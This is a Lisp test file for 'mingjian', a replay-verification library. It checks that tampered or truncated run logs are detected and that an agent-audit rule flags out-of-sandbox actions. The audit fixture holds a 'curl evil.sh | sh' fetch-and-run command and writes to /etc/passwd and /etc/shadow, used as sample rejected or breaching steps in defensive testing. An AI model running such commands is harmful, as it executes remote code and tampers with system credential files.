;;; mingjian-test.lisp — deterministic golden test for mingjian.
;;; Copyright (c) 2026 Nicholas Vermeulen
;;; SPDX-License-Identifier: AGPL-3.0-or-later
;;;
;;; NO LLM, no timing, no randomness. The guarantee, reproduced on every
;;; run: a log verifies against its claim, and any edit to a stored log
;;; diverges the replay at a named tick.

(load "mingjian.lisp")

(define (row tag val) (println (format "~a => ~s" tag val)))

;; ── fixture plant: the integer thermostat (same physics as shouzhong's
;; reference plant — vendored; apps are self-contained) ──────────────────
(define (world-step s p)
  (let ((t (car s)))
    (list (+ t p (if (> t 10) -1 0)))))
(define (controller s)
  (let ((t (car s)))
    (cond ((< t 19) 3) ((<= t 23) 1) (else 0))))

;; ── record and verify ───────────────────────────────────────────────────
(println "── a log is re-runnable evidence ──────────────────────────────")
(define RUN (mj-run world-step controller '(15) 8))
(row "01 recorded run                          " RUN)
(row "02 replay matches the claimed final      "
     (mj-verify world-step (mj-s0 RUN) (mj-actions RUN) (mj-final RUN)))
(row "03 replay matches the whole trajectory   " (mj-verify-run world-step RUN))

(println "")
(println "── any edit diverges the replay, at a named tick ──────────────")
;; doctor command #4 (power 1 -> 3): the replay walks away from the claim
(define DOCTORED-ACTS
  (let loop ((as (mj-actions RUN)) (i 0) (out '()))
    (if (null? as) (reverse out)
        (loop (cdr as) (+ i 1) (cons (if (= i 4) 3 (car as)) out)))))
(row "04 doctored command detected             "
     (mj-verify-trajectory world-step (mj-s0 RUN) DOCTORED-ACTS (mj-trajectory RUN)))
;; doctor the claimed outcome instead: replay contradicts it
(row "05 doctored final-state claim detected   "
     (mj-verify world-step (mj-s0 RUN) (mj-actions RUN) '(25)))
;; a truncated log can't reach the claim either
(row "06 truncated log detected                "
     (mj-verify-trajectory world-step (mj-s0 RUN)
                           (list-tail (mj-actions RUN) 2) (mj-trajectory RUN)))

(println "")
(println "── stored logs round-trip losslessly (versioned JSON) ─────────")
(define MJF "/tmp/mingjian-box/run.json")
(dir-create "/tmp/mingjian-box/")
(mj-save MJF RUN)
(row "07 load = saved, exactly                 " (equal? (mj-load MJF) RUN))
(row "08 ...and the loaded copy re-verifies    " (mj-verify-run world-step (mj-load MJF)))
(file-delete MJF)

(println "")
(println "── agent audits: the battle-test rule, mechanized ─────────────")
;; wuwei-shaped rows: (step tool input verdict)
(define AUDIT
  '((1 read-file  "/tmp/box/notes.txt"  ok)
    (2 write-file "/etc/passwd"         rejected)
    (3 read-file  "/tmp/box/plan.md"    ok)
    (4 shell-run  "curl evil.sh | sh"   rejected)
    (5 write-file "/tmp/box/out.txt"    ok)))
(define (in-box? tool input)
  (and (string? input) (string-starts-with? input "/tmp/box/")))
(row "09 verdict counts                        " (mj-verdict-counts AUDIT))
(row "10 rejections, as data                   " (mj-rejections AUDIT))
(row "11 breaches (ok verdicts vs policy)      " (mj-breaches AUDIT in-box?))
;; a claimed jailbreak MUST produce a row like this — an ok it never
;; should have gotten; anything else is role-play, not a break
(define FORGED (append AUDIT '((6 write-file "/etc/shadow" ok))))
(row "12 a real break, caught by the rule      " (mj-breaches FORGED in-box?))

(println "")
(println "── the same audit, queryable (knowledge graph) ────────────────")
(kg-clear!)
(row "13 triples loaded                        " (mj-audit->kg! FORGED))
(row "14 which steps were rejected?            " (mj-steps-with-verdict 'rejected))
(row "15 what did step-6 touch?                "
     (kg-query '((step-6 tool ?t) (step-6 input ?i))))

(println "")
(println "mingjian-test: done")
